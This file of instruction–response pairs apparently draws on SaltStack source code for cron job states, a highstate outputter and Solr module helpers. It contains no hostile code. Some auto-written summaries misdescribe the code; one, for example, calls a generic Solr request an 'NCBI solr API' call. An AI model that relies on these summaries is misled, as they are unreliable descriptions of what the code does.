{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn a dict that contains the specified crontab entry for the specified user.", "response": "def present(name,\n            user='root',\n            minute='*',\n            hour='*',\n            daymonth='*',\n            month='*',\n            dayweek='*',\n            comment=None,\n            commented=False,\n            identifier=False,\n            special=None):\n    '''\n    Verifies that the specified cron job is present for the specified user.\n    It is recommended to use `identifier`. Otherwise the cron job is installed\n    twice if you change the name.\n    For more advanced information about what exactly can be set in the cron\n    timing parameters, check your cron system's documentation. Most Unix-like\n    systems' cron documentation can be found via the crontab man page:\n    ``man 5 crontab``.\n\n    name\n        The command that should be executed by the cron job.\n\n    user\n        The name of the user whose crontab needs to be modified, defaults to\n        the root user\n\n    minute\n        The information to be set into the minute section, this can be any\n        string supported by your cron system's the minute field. Default is\n        ``*``\n\n    hour\n        The information to be set in the hour section. Default is ``*``\n\n    daymonth\n        The information to be set in the day of month section. Default is ``*``\n\n    month\n        The information to be set in the month section. Default is ``*``\n\n    dayweek\n        The information to be set in the day of week section. Default is ``*``\n\n    comment\n        User comment to be added on line previous the cron job\n\n    commented\n        The cron job is set commented (prefixed with ``#DISABLED#``).\n        Defaults to False.\n\n        .. versionadded:: 2016.3.0\n\n    identifier\n        Custom-defined identifier for tracking the cron line for future crontab\n        edits. This defaults to the state name\n\n    special\n        A special keyword to specify periodicity (eg. @reboot, @hourly...).\n        Quotes must be used, otherwise PyYAML will strip the '@' sign.\n\n        .. versionadded:: 2016.3.0\n    '''\n    name = name.strip()\n    if identifier is False:\n        identifier = name\n    ret = {'changes': {},\n           'comment': '',\n           'name': name,\n           'result': True}\n    if __opts__['test']:\n        status = _check_cron(user,\n                             cmd=name,\n                             minute=minute,\n                             hour=hour,\n                             daymonth=daymonth,\n                             month=month,\n                             dayweek=dayweek,\n                             comment=comment,\n                             commented=commented,\n                             identifier=identifier,\n                             special=special)\n        ret['result'] = None\n        if status == 'absent':\n            ret['comment'] = 'Cron {0} is set to be added'.format(name)\n        elif status == 'present':\n            ret['result'] = True\n            ret['comment'] = 'Cron {0} already present'.format(name)\n        elif status == 'update':\n            ret['comment'] = 'Cron {0} is set to be updated'.format(name)\n        return ret\n\n    if special is None:\n        data = __salt__['cron.set_job'](user=user,\n                                        minute=minute,\n                                        hour=hour,\n                                        daymonth=daymonth,\n                                        month=month,\n                                        dayweek=dayweek,\n                                        cmd=name,\n                                        comment=comment,\n                                        commented=commented,\n                                        identifier=identifier)\n    else:\n        data = __salt__['cron.set_special'](user=user,\n                                            special=special,\n                                            cmd=name,\n                                            comment=comment,\n                                            commented=commented,\n                                            identifier=identifier)\n    if data == 'present':\n        ret['comment'] = 'Cron {0} already present'.format(name)\n        return ret\n\n    if data == 'new':\n        ret['comment'] = 'Cron {0} added to {1}\\'s crontab'.format(name, user)\n        ret['changes'] = {user: name}\n        return ret\n\n    if data == 'updated':\n        ret['comment'] = 'Cron {0} updated'.format(name)\n        ret['changes'] = {user: name}\n        return ret\n    ret['comment'] = ('Cron {0} for user {1} failed to commit with error \\n{2}'\n                      .format(name, user, data))\n    ret['result'] = False\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nensures that the specified cron job is absent for the specified user.", "response": "def absent(name,\n           user='root',\n           identifier=False,\n           special=None,\n           **kwargs):\n    '''\n    Verifies that the specified cron job is absent for the specified user; only\n    the name is matched when removing a cron job.\n\n    name\n        The command that should be absent in the user crontab.\n\n    user\n        The name of the user whose crontab needs to be modified, defaults to\n        the root user\n\n    identifier\n        Custom-defined identifier for tracking the cron line for future crontab\n        edits. This defaults to the state name\n\n    special\n        The special keyword used in the job (eg. @reboot, @hourly...).\n        Quotes must be used, otherwise PyYAML will strip the '@' sign.\n    '''\n    # NOTE: The keyword arguments in **kwargs are ignored in this state, but\n    #       cannot be removed from the function definition, otherwise the use\n    #       of unsupported arguments will result in a traceback.\n\n    name = name.strip()\n    if identifier is False:\n        identifier = name\n    ret = {'name': name,\n           'result': True,\n           'changes': {},\n           'comment': ''}\n\n    if __opts__['test']:\n        status = _check_cron(user, name, identifier=identifier)\n        ret['result'] = None\n        if status == 'absent':\n            ret['result'] = True\n            ret['comment'] = 'Cron {0} is absent'.format(name)\n        elif status == 'present' or status == 'update':\n            ret['comment'] = 'Cron {0} is set to be removed'.format(name)\n        return ret\n\n    if special is None:\n        data = __salt__['cron.rm_job'](user, name, identifier=identifier)\n    else:\n        data = __salt__['cron.rm_special'](user, name, special=special, identifier=identifier)\n\n    if data == 'absent':\n        ret['comment'] = \"Cron {0} already absent\".format(name)\n        return ret\n    if data == 'removed':\n        ret['comment'] = (\"Cron {0} removed from {1}'s crontab\"\n                          .format(name, user))\n        ret['changes'] = {user: name}\n        return ret\n    ret['comment'] = (\"Cron {0} for user {1} failed to commit with error {2}\"\n                      .format(name, user, data))\n    ret['result'] = False\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nproviding file.managed-like functionality (templating, etc.) for a pre-made crontab file, to be assigned to a given user. name The source file to be used as the crontab. This source file can be hosted on either the salt master server, or on an HTTP or FTP server. For files hosted on the salt file server, if the file is located on the master in the directory named spam, and is called eggs, the source string is ``salt://spam/eggs`` If the file is hosted on a HTTP or FTP server then the source_hash argument is also required source_hash This can be either a file which contains a source hash string for the source, or a source hash string. The source hash string is the hash algorithm followed by the hash of the file: ``md5=e138491e9d5b97023cea823fe17bac22`` source_hash_name When ``source_hash`` refers to a hash file, Salt will try to find the correct hash by matching the filename/URI associated with that hash. By default, Salt will look for the filename being managed. When managing a file at path ``/tmp/foo.txt``, then the following line in a hash file would match: .. code-block:: text acbd18db4cc2f85cedef654fccc4a4d8 foo.txt However, sometimes a hash file will include multiple similar paths: .. code-block:: text 37b51d194a7513e45b56f6524f2d51f2 ./dir1/foo.txt acbd18db4cc2f85cedef654fccc4a4d8 ./dir2/foo.txt 73feffa4b7f6bb68e44cf984c85f6e88 ./dir3/foo.txt In cases like this, Salt may match the incorrect hash. This argument can be used to tell Salt which filename to match, to ensure that the correct hash is identified. For example: .. code-block:: yaml foo_crontab: cron.file: - name: https://mydomain.tld/dir2/foo.txt - source_hash: https://mydomain.tld/hashes - source_hash_name: ./dir2/foo.txt .. note:: This argument must contain the full filename entry from the checksum file, as this argument is meant to disambiguate matches for multiple files that have the same basename. So, in the example above, simply using ``foo.txt`` would not match. .. versionadded:: 2016.3.5 user The user to whom the crontab should be assigned. This defaults to root. template If this setting is applied then the named templating engine will be used to render the downloaded file. Currently, jinja and mako are supported. context Overrides default context variables passed to the template. replace If the crontab should be replaced, if False then this command will be ignored if a crontab exists for the specified user. Default is True. defaults Default context passed to the template. backup Overrides the default backup mode for the user's crontab.", "response": "def file(name,\n         source_hash='',\n         source_hash_name=None,\n         user='root',\n         template=None,\n         context=None,\n         replace=True,\n         defaults=None,\n         backup='',\n         **kwargs):\n    '''\n    Provides file.managed-like functionality (templating, etc.) for a pre-made\n    crontab file, to be assigned to a given user.\n\n    name\n        The source file to be used as the crontab. This source file can be\n        hosted on either the salt master server, or on an HTTP or FTP server.\n        For files hosted on the salt file server, if the file is located on\n        the master in the directory named spam, and is called eggs, the source\n        string is ``salt://spam/eggs``\n\n        If the file is hosted on a HTTP or FTP server then the source_hash\n        argument is also required\n\n    source_hash\n        This can be either a file which contains a source hash string for\n        the source, or a source hash string. The source hash string is the\n        hash algorithm followed by the hash of the file:\n        ``md5=e138491e9d5b97023cea823fe17bac22``\n\n    source_hash_name\n        When ``source_hash`` refers to a hash file, Salt will try to find the\n        correct hash by matching the filename/URI associated with that hash. By\n        default, Salt will look for the filename being managed. When managing a\n        file at path ``/tmp/foo.txt``, then the following line in a hash file\n        would match:\n\n        .. code-block:: text\n\n            acbd18db4cc2f85cedef654fccc4a4d8    foo.txt\n\n        However, sometimes a hash file will include multiple similar paths:\n\n        .. code-block:: text\n\n            37b51d194a7513e45b56f6524f2d51f2    ./dir1/foo.txt\n            acbd18db4cc2f85cedef654fccc4a4d8    ./dir2/foo.txt\n            73feffa4b7f6bb68e44cf984c85f6e88    ./dir3/foo.txt\n\n        In cases like this, Salt may match the incorrect hash. This argument\n        can be used to tell Salt which filename to match, to ensure that the\n        correct hash is identified. For example:\n\n        .. code-block:: yaml\n\n            foo_crontab:\n              cron.file:\n                - name: https://mydomain.tld/dir2/foo.txt\n                - source_hash: https://mydomain.tld/hashes\n                - source_hash_name: ./dir2/foo.txt\n\n        .. note::\n            This argument must contain the full filename entry from the\n            checksum file, as this argument is meant to disambiguate matches\n            for multiple files that have the same basename. So, in the\n            example above, simply using ``foo.txt`` would not match.\n\n        .. versionadded:: 2016.3.5\n\n    user\n        The user to whom the crontab should be assigned. This defaults to\n        root.\n\n    template\n        If this setting is applied then the named templating engine will be\n        used to render the downloaded file. Currently, jinja and mako are\n        supported.\n\n    context\n        Overrides default context variables passed to the template.\n\n    replace\n        If the crontab should be replaced, if False then this command will\n        be ignored if a crontab exists for the specified user. Default is True.\n\n    defaults\n        Default context passed to the template.\n\n    backup\n        Overrides the default backup mode for the user's crontab.\n    '''\n    # Initial set up\n    mode = '0600'\n\n    try:\n        group = __salt__['user.info'](user)['groups'][0]\n    except Exception:\n        ret = {'changes': {},\n               'comment': \"Could not identify group for user {0}\".format(user),\n               'name': name,\n               'result': False}\n        return ret\n\n    cron_path = salt.utils.files.mkstemp()\n    with salt.utils.files.fopen(cron_path, 'w+') as fp_:\n        raw_cron = __salt__['cron.raw_cron'](user)\n        if not raw_cron.endswith('\\n'):\n            raw_cron = \"{0}\\n\".format(raw_cron)\n        fp_.write(salt.utils.stringutils.to_str(raw_cron))\n\n    ret = {'changes': {},\n           'comment': '',\n           'name': name,\n           'result': True}\n\n    # Avoid variable naming confusion in below module calls, since ID\n    # declaration for this state will be a source URI.\n    source = name\n\n    if not replace and os.stat(cron_path).st_size > 0:\n        ret['comment'] = 'User {0} already has a crontab. No changes ' \\\n                         'made'.format(user)\n        os.unlink(cron_path)\n        return ret\n\n    if __opts__['test']:\n        fcm = __salt__['file.check_managed'](name=cron_path,\n                                             source=source,\n                                             source_hash=source_hash,\n                                             source_hash_name=source_hash_name,\n                                             user=user,\n                                             group=group,\n                                             mode=mode,\n                                             attrs=[],  # no special attrs for cron\n                                             template=template,\n                                             context=context,\n                                             defaults=defaults,\n                                             saltenv=__env__,\n                                             **kwargs\n                                             )\n        ret['result'], ret['comment'] = fcm\n        os.unlink(cron_path)\n        return ret\n\n    # If the source is a list then find which file exists\n    source, source_hash = __salt__['file.source_list'](source,\n                                                       source_hash,\n                                                       __env__)\n\n    # Gather the source file from the server\n    try:\n        sfn, source_sum, comment = __salt__['file.get_managed'](\n            name=cron_path,\n            template=template,\n            source=source,\n            source_hash=source_hash,\n            source_hash_name=source_hash_name,\n            user=user,\n            group=group,\n            mode=mode,\n            attrs=[],\n            saltenv=__env__,\n            context=context,\n            defaults=defaults,\n            skip_verify=False,        # skip_verify\n            **kwargs\n        )\n    except Exception as exc:\n        ret['result'] = False\n        ret['changes'] = {}\n        ret['comment'] = 'Unable to manage file: {0}'.format(exc)\n        return ret\n\n    if comment:\n        ret['comment'] = comment\n        ret['result'] = False\n        os.unlink(cron_path)\n        return ret\n\n    try:\n        ret = __salt__['file.manage_file'](\n            name=cron_path,\n            sfn=sfn,\n            ret=ret,\n            source=source,\n            source_sum=source_sum,\n            user=user,\n            group=group,\n            mode=mode,\n            attrs=[],\n            saltenv=__env__,\n            backup=backup\n        )\n    except Exception as exc:\n        ret['result'] = False\n        ret['changes'] = {}\n        ret['comment'] = 'Unable to manage file: {0}'.format(exc)\n        return ret\n\n    cron_ret = None\n    if \"diff\" in ret['changes']:\n        cron_ret = __salt__['cron.write_cron_file_verbose'](user, cron_path)\n        # Check cmd return code and show success or failure\n        if cron_ret['retcode'] == 0:\n            ret['comment'] = 'Crontab for user {0} was updated'.format(user)\n            ret['result'] = True\n            ret['changes'] = ret['changes']\n        else:\n            ret['comment'] = 'Unable to update user {0} crontab {1}.' \\\n                             ' Error: {2}'.format(user, cron_path, cron_ret['stderr'])\n            ret['result'] = False\n            ret['changes'] = {}\n    elif ret['result']:\n        ret['comment'] = 'Crontab for user {0} is in the correct ' \\\n                         'state'.format(user)\n        ret['changes'] = {}\n\n    os.unlink(cron_path)\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nensure that the specified environment variable is present in the crontab.", "response": "def env_present(name,\n                value=None,\n                user='root'):\n    '''\n    Verifies that the specified environment variable is present in the crontab\n    for the specified user.\n\n    name\n        The name of the environment variable to set in the user crontab\n\n    user\n        The name of the user whose crontab needs to be modified, defaults to\n        the root user\n\n    value\n        The value to set for the given environment variable\n    '''\n    ret = {'changes': {},\n           'comment': '',\n           'name': name,\n           'result': True}\n    if __opts__['test']:\n        status = _check_cron_env(user, name, value=value)\n        ret['result'] = None\n        if status == 'absent':\n            ret['comment'] = 'Cron env {0} is set to be added'.format(name)\n        elif status == 'present':\n            ret['result'] = True\n            ret['comment'] = 'Cron env {0} already present'.format(name)\n        elif status == 'update':\n            ret['comment'] = 'Cron env {0} is set to be updated'.format(name)\n        return ret\n\n    data = __salt__['cron.set_env'](user, name, value=value)\n    if data == 'present':\n        ret['comment'] = 'Cron env {0} already present'.format(name)\n        return ret\n\n    if data == 'new':\n        ret['comment'] = 'Cron env {0} added to {1}\\'s crontab'.format(name, user)\n        ret['changes'] = {user: name}\n        return ret\n\n    if data == 'updated':\n        ret['comment'] = 'Cron env {0} updated'.format(name)\n        ret['changes'] = {user: name}\n        return ret\n    ret['comment'] = ('Cron env {0} for user {1} failed to commit with error \\n{2}'\n                      .format(name, user, data))\n    ret['result'] = False\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef env_absent(name,\n               user='root'):\n    '''\n    Verifies that the specified environment variable is absent from the crontab\n    for the specified user\n\n    name\n        The name of the environment variable to remove from the user crontab\n\n    user\n        The name of the user whose crontab needs to be modified, defaults to\n        the root user\n    '''\n\n    name = name.strip()\n    ret = {'name': name,\n           'result': True,\n           'changes': {},\n           'comment': ''}\n\n    if __opts__['test']:\n        status = _check_cron_env(user, name)\n        ret['result'] = None\n        if status == 'absent':\n            ret['result'] = True\n            ret['comment'] = 'Cron env {0} is absent'.format(name)\n        elif status == 'present' or status == 'update':\n            ret['comment'] = 'Cron env {0} is set to be removed'.format(name)\n        return ret\n\n    data = __salt__['cron.rm_env'](user, name)\n    if data == 'absent':\n        ret['comment'] = \"Cron env {0} already absent\".format(name)\n        return ret\n    if data == 'removed':\n        ret['comment'] = (\"Cron env {0} removed from {1}'s crontab\"\n                          .format(name, user))\n        ret['changes'] = {user: name}\n        return ret\n    ret['comment'] = (\"Cron env {0} for user {1} failed to commit with error {2}\"\n                      .format(name, user, data))\n    ret['result'] = False\n    return ret", "response": "Ensures that the specified environment variable is absent from the crontab environment variable for the specified user."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\noutputting the data dictionary to a highstate file.", "response": "def output(data, **kwargs):  # pylint: disable=unused-argument\n    '''\n    The HighState Outputter is only meant to be used with the state.highstate\n    function, or a function that returns highstate return data.\n    '''\n    if len(data.keys()) == 1:\n        # account for nested orchs via saltutil.runner\n        if 'return' in data:\n            data = data['return']\n\n        # account for envelope data if being passed lookup_jid ret\n        if isinstance(data, dict):\n            _data = next(iter(data.values()))\n            if 'jid' in _data and 'fun' in _data:\n                data = _data['return']\n\n    # output() is recursive, if we aren't passed a dict just return it\n    if isinstance(data, int) or isinstance(data, six.string_types):\n        return data\n\n    # Discard retcode in dictionary as present in orchestrate data\n    local_masters = [key for key in data.keys() if key.endswith('_master')]\n    orchestrator_output = 'retcode' in data.keys() and len(local_masters) == 1\n\n    if orchestrator_output:\n        del data['retcode']\n\n    # If additional information is passed through via the \"data\" dictionary to\n    # the highstate outputter, such as \"outputter\" or \"retcode\", discard it.\n    # We only want the state data that was passed through, if it is wrapped up\n    # in the \"data\" key, as the orchestrate runner does. See Issue #31330,\n    # pull request #27838, and pull request #27175 for more information.\n    if 'data' in data:\n        data = data.pop('data')\n\n    indent_level = kwargs.get('indent_level', 1)\n    ret = [\n        _format_host(host, hostdata, indent_level=indent_level)[0]\n        for host, hostdata in six.iteritems(data)\n    ]\n    if ret:\n        return \"\\n\".join(ret)\n    log.error(\n        'Data passed to highstate outputter is not a valid highstate return: %s',\n        data\n    )\n    # We should not reach here, but if we do return empty string\n    return ''"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nprint the changes data using the nested outputter", "response": "def _nested_changes(changes):\n    '''\n    Print the changes data using the nested outputter\n    '''\n    ret = '\\n'\n    ret += salt.output.out_format(\n            changes,\n            'nested',\n            __opts__,\n            nested_indent=14)\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nformat the changes dict based on what the data is", "response": "def _format_changes(changes, orchestration=False):\n    '''\n    Format the changes dict based on what the data is\n    '''\n    if not changes:\n        return False, ''\n\n    if orchestration:\n        return True, _nested_changes(changes)\n\n    if not isinstance(changes, dict):\n        return True, 'Invalid Changes data: {0}'.format(changes)\n\n    ret = changes.get('ret')\n    if ret is not None and changes.get('out') == 'highstate':\n        ctext = ''\n        changed = False\n        for host, hostdata in six.iteritems(ret):\n            s, c = _format_host(host, hostdata)\n            ctext += '\\n' + '\\n'.join((' ' * 14 + l) for l in s.splitlines())\n            changed = changed or c\n    else:\n        changed = True\n        ctext = _nested_changes(changes)\n    return changed, ctext"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nformats a message in Terse format.", "response": "def _format_terse(tcolor, comps, ret, colors, tabular):\n    '''\n    Terse formatting of a message.\n    '''\n    result = 'Clean'\n    if ret['changes']:\n        result = 'Changed'\n    if ret['result'] is False:\n        result = 'Failed'\n    elif ret['result'] is None:\n        result = 'Differs'\n    if tabular is True:\n        fmt_string = ''\n        if 'warnings' in ret:\n            fmt_string += '{c[LIGHT_RED]}Warnings:\\n{w}{c[ENDC]}\\n'.format(\n                c=colors, w='\\n'.join(ret['warnings'])\n            )\n        fmt_string += '{0}'\n        if __opts__.get('state_output_profile', True) and 'start_time' in ret:\n            fmt_string += '{6[start_time]!s} [{6[duration]!s:>7} ms] '\n        fmt_string += '{2:>10}.{3:<10} {4:7}   Name: {1}{5}'\n    elif isinstance(tabular, six.string_types):\n        fmt_string = tabular\n    else:\n        fmt_string = ''\n        if 'warnings' in ret:\n            fmt_string += '{c[LIGHT_RED]}Warnings:\\n{w}{c[ENDC]}'.format(\n                c=colors, w='\\n'.join(ret['warnings'])\n            )\n        fmt_string += ' {0} Name: {1} - Function: {2}.{3} - Result: {4}'\n        if __opts__.get('state_output_profile', True) and 'start_time' in ret:\n            fmt_string += ' Started: - {6[start_time]!s} Duration: {6[duration]!s} ms'\n        fmt_string += '{5}'\n\n    msg = fmt_string.format(tcolor,\n                            comps[2],\n                            comps[0],\n                            comps[-1],\n                            result,\n                            colors['ENDC'],\n                            ret)\n    return msg"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning a dict with the state of the kernelpkg state based on a watch command.", "response": "def mod_watch(name, sfun, **kwargs):\n    '''\n    The kernerpkg watcher, called to invoke the watch command.\n    When called, execute a kernelpkg state based on a watch or listen call.\n\n    .. note::\n        This state exists to support special handling of the ``watch``\n        :ref:`requisite <requisites>`. It should not be called directly.\n\n        Parameters for this function should be set by the state being triggered.\n    '''\n    if sfun in ('latest_active', 'latest_wait'):\n        return latest_active(name, **kwargs)\n    else:\n        return {'name': name, 'changes': {},\n                'comment': 'kernelpkg.{0} does not work with the watch '\n                           'requisite.'.format(sfun),\n                'result': False}"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _get_none_or_value(value):\n    '''\n    PRIVATE METHOD\n    Checks to see if the value of a primitive or built-in container such as\n    a list, dict, set, tuple etc is empty or none. None type is returned if the\n    value is empty/None/False. Number data types that are 0 will return None.\n\n    value : obj\n        The primitive or built-in container to evaluate.\n\n    Return: None or value\n    '''\n    if value is None:\n        return None\n    elif not value:\n        return value\n    # if it's a string, and it's not empty check for none\n    elif isinstance(value, six.string_types):\n        if value.lower() == 'none':\n            return None\n        return value\n    # return None\n    else:\n        return None", "response": "Private method to return None or value depending on the value of the object."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _update_return_dict(ret, success, data, errors=None, warnings=None):\n    '''\n    PRIVATE METHOD\n    Updates the return dictionary and returns it.\n\n    ret : dict<str,obj>\n        The original return dict to update. The ret param should have\n        been created from _get_return_dict()\n    success : boolean (True)\n        True indicates a successful result.\n    data : dict<str,obj> ({})\n        Data to be returned to the caller.\n    errors : list<str> ([()])\n        A list of error messages to be returned to the caller\n    warnings : list<str> ([])\n        A list of warnings to be returned to the caller.\n\n    Return: dict<str,obj>::\n\n        {'success':boolean, 'data':dict, 'errors':list, 'warnings':list}\n    '''\n    errors = [] if errors is None else errors\n    warnings = [] if warnings is None else warnings\n    ret['success'] = success\n    ret['data'].update(data)\n    ret['errors'] = ret['errors'] + errors\n    ret['warnings'] = ret['warnings'] + warnings\n    return ret", "response": "Private method to update the return dictionary of the base object."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _format_url(handler, host=None, core_name=None, extra=None):\n    '''\n    PRIVATE METHOD\n    Formats the URL based on parameters, and if cores are used or not\n\n    handler : str\n        The request handler to hit.\n    host : str (None)\n        The solr host to query. __opts__['host'] is default\n    core_name : str (None)\n        The name of the solr core if using cores. Leave this blank if you\n        are not using cores or if you want to check all cores.\n    extra : list<str> ([])\n        A list of name value pairs in string format. e.g. ['name=value']\n\n    Return: str\n        Fully formatted URL (http://<host>:<port>/solr/<handler>?wt=json&<extra>)\n    '''\n    extra = [] if extra is None else extra\n    if _get_none_or_value(host) is None or host == 'None':\n        host = __salt__['config.option']('solr.host')\n    port = __salt__['config.option']('solr.port')\n    baseurl = __salt__['config.option']('solr.baseurl')\n    if _get_none_or_value(core_name) is None:\n        if not extra:\n            return \"http://{0}:{1}{2}/{3}?wt=json\".format(\n                    host, port, baseurl, handler)\n        else:\n            return \"http://{0}:{1}{2}/{3}?wt=json&{4}\".format(\n                    host, port, baseurl, handler, \"&\".join(extra))\n    else:\n        if not extra:\n            return \"http://{0}:{1}{2}/{3}/{4}?wt=json\".format(\n                    host, port, baseurl, core_name, handler)\n        else:\n            return \"http://{0}:{1}{2}/{3}/{4}?wt=json&{5}\".format(\n                    host, port, baseurl, core_name, handler, \"&\".join(extra))", "response": "Formats the URL based on parameters and returns the full URL."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ninstall an auth handler for urllib2", "response": "def _auth(url):\n    '''\n    Install an auth handler for urllib2\n    '''\n    user = __salt__['config.get']('solr.user', False)\n    password = __salt__['config.get']('solr.passwd', False)\n    realm = __salt__['config.get']('solr.auth_realm', 'Solr')\n\n    if user and password:\n        basic = _HTTPBasicAuthHandler()\n        basic.add_password(\n            realm=realm, uri=url, user=user, passwd=password\n        )\n        digest = _HTTPDigestAuthHandler()\n        digest.add_password(\n            realm=realm, uri=url, user=user, passwd=password\n        )\n        _install_opener(\n            _build_opener(basic, digest)\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _http_request(url, request_timeout=None):\n    '''\n    PRIVATE METHOD\n    Uses salt.utils.json.load to fetch the JSON results from the solr API.\n\n    url : str\n        a complete URL that can be passed to urllib.open\n    request_timeout : int (None)\n        The number of seconds before the timeout should fail. Leave blank/None\n        to use the default. __opts__['solr.request_timeout']\n\n    Return: dict<str,obj>::\n\n         {'success':boolean, 'data':dict, 'errors':list, 'warnings':list}\n    '''\n    _auth(url)\n    try:\n\n        request_timeout = __salt__['config.option']('solr.request_timeout')\n        kwargs = {} if request_timeout is None else {'timeout': request_timeout}\n        data = salt.utils.json.load(_urlopen(url, **kwargs))\n        return _get_return_dict(True, data, [])\n    except Exception as err:\n        return _get_return_dict(False, {}, [\"{0} : {1}\".format(url, err)])", "response": "Private method to make an HTTP request to the NCBI solr API."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nexecute an admin command and return the response as a dict.", "response": "def _get_admin_info(command, host=None, core_name=None):\n    '''\n    PRIVATE METHOD\n    Calls the _http_request method and passes the admin command to execute\n    and stores the data. This data is fairly static but should be refreshed\n    periodically to make sure everything this OK. The data object will contain\n    the JSON response.\n\n    command : str\n        The admin command to execute.\n    host : str (None)\n        The solr host to query. __opts__['host'] is default\n    core_name: str (None)\n        The name of the solr core if using cores. Leave this blank if you are\n        not using cores or if you want to check all cores.\n\n    Return: dict<str,obj>::\n\n        {'success':boolean, 'data':dict, 'errors':list, 'warnings':list}\n    '''\n    url = _format_url(\"admin/{0}\".format(command), host, core_name=core_name)\n    resp = _http_request(url)\n    return resp"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _merge_options(options):\n    '''\n    PRIVATE METHOD\n    updates the default import options from __opts__['solr.dih.import_options']\n    with the dictionary passed in.  Also converts booleans to strings\n    to pass to solr.\n\n    options : dict<str,boolean>\n        Dictionary the over rides the default options defined in\n        __opts__['solr.dih.import_options']\n\n    Return: dict<str,boolean>::\n\n        {option:boolean}\n    '''\n    defaults = __salt__['config.option']('solr.dih.import_options')\n    if isinstance(options, dict):\n        defaults.update(options)\n    for key, val in six.iteritems(defaults):\n        if isinstance(val, bool):\n            defaults[key] = six.text_type(val).lower()\n    return defaults", "response": "Private method to merge the default options from the passed in dictionary into the default ones."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _find_value(ret_dict, key, path=None):\n    '''\n    PRIVATE METHOD\n    Traverses a dictionary of dictionaries/lists to find key\n    and return the value stored.\n    TODO:// this method doesn't really work very well, and it's not really\n            very useful in its current state. The purpose for this method is\n            to simplify parsing the JSON output so you can just pass the key\n            you want to find and have it return the value.\n    ret : dict<str,obj>\n        The dictionary to search through. Typically this will be a dict\n        returned from solr.\n    key : str\n        The key (str) to find in the dictionary\n\n    Return: list<dict<str,obj>>::\n\n        [{path:path, value:value}]\n    '''\n    if path is None:\n        path = key\n    else:\n        path = \"{0}:{1}\".format(path, key)\n\n    ret = []\n    for ikey, val in six.iteritems(ret_dict):\n        if ikey == key:\n            ret.append({path: val})\n        if isinstance(val, list):\n            for item in val:\n                if isinstance(item, dict):\n                    ret = ret + _find_value(item, key, path)\n        if isinstance(val, dict):\n            ret = ret + _find_value(val, key, path)\n    return ret", "response": "Private method to find the value of a key in a dictionary"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef lucene_version(core_name=None):\n    '''\n    Gets the lucene version that solr is using. If you are running a multi-core\n    setup you should specify a core name since all the cores run under the same\n    servlet container, they will all have the same version.\n\n    core_name : str (None)\n        The name of the solr core if using cores. Leave this blank if you are\n        not using cores or if you want to check all cores.\n\n    Return: dict<str,obj>::\n\n        {'success':boolean, 'data':dict, 'errors':list, 'warnings':list}\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' solr.lucene_version\n    '''\n    ret = _get_return_dict()\n    # do we want to check for all the cores?\n    if _get_none_or_value(core_name) is None and _check_for_cores():\n        success = True\n        for name in __salt__['config.option']('solr.cores'):\n            resp = _get_admin_info('system', core_name=name)\n            if resp['success']:\n                version_num = resp['data']['lucene']['lucene-spec-version']\n                data = {name: {'lucene_version': version_num}}\n            else:  # generally this means that an exception happened.\n                data = {name: {'lucene_version': None}}\n                success = False\n            ret = _update_return_dict(ret, success, data, resp['errors'])\n        return ret\n    else:\n        resp = _get_admin_info('system', core_name=core_name)\n        if resp['success']:\n            version_num = resp['data']['lucene']['lucene-spec-version']\n            return _get_return_dict(True, {'version': version_num}, resp['errors'])\n        else:\n            return resp", "response": "Returns the lucene version that solr is using."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef version(core_name=None):\n    '''\n    Gets the solr version for the core specified.  You should specify a core\n    here as all the cores will run under the same servlet container and so will\n    all have the same version.\n\n    core_name : str (None)\n        The name of the solr core if using cores. Leave this blank if you are\n        not using cores or if you want to check all cores.\n\n    Return : dict<str,obj>::\n\n        {'success':boolean, 'data':dict, 'errors':list, 'warnings':list}\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' solr.version\n    '''\n    ret = _get_return_dict()\n    # do we want to check for all the cores?\n    if _get_none_or_value(core_name) is None and _check_for_cores():\n        success = True\n        for name in __opts__['solr.cores']:\n            resp = _get_admin_info('system', core_name=name)\n            if resp['success']:\n                lucene = resp['data']['lucene']\n                data = {name: {'version': lucene['solr-spec-version']}}\n            else:\n                success = False\n                data = {name: {'version': None}}\n            ret = _update_return_dict(ret, success, data,\n                                      resp['errors'], resp['warnings'])\n        return ret\n    else:\n        resp = _get_admin_info('system', core_name=core_name)\n        if resp['success']:\n            version_num = resp['data']['lucene']['solr-spec-version']\n            return _get_return_dict(True, {'version': version_num},\n                                    resp['errors'], resp['warnings'])\n        else:\n            return resp", "response": "Get the solr version for the specified core."}
